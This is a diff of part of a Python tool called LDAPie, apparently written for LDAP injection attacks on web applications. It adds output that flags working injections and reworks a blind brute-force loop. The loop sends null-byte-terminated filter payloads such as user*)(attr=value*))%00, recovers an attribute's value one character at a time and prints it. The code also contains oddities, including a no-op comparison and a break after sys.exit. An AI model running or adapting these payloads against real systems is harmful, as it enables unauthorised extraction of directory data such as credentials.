@@ -58,8 +58,9 @@ class LDAPie:
                 r = requests.get(url)
                 time.sleep(5)
                 l = r.text
-                print('\033[1;31m'+url)
+#                print('\033[1;31m'+url)
                 if len(l) != cl1:
+                   print('\033[1;32mVALID LDAP INJECTION: '+x)
                    inj.append(str(x))
             return inj
 
@@ -73,15 +74,16 @@ class LDAPie:
                 bf = requests.get(url+'='+user+'*)('+inj+'='+val+x+"*))%00")
 #                print(bf.url)
                 if user not in bf.content:
-                    val =- x
                     val == val
                 else:
                     val += x
-                    break
-        r = requests.get(url+'='+user+'*)('+inj+'='+val+'))%00')
-        if user in r.content:
-            print(val)
-        break
+                    
+                    r = requests.get(url+'='+user+'*)('+inj+'='+val+'))%00')
+                    if user in r.content:
+                        print('\033[1;33mHere is the value of the '+inj+' attribute \033[1;33m'+val)
+                        print('PLEASE REMOVE THE TESTED ATTRIBUTE FROM THE WORDLIST TO TEST MORE ATTRIBUTES')
+                        sys.exit(0)
+                        break
 #main
 #SHOUT OUT TO RASTAMOUSE FOR THIS METHOD ON HOW TO HANDLE COMMANDLINE ARGS
 post = False
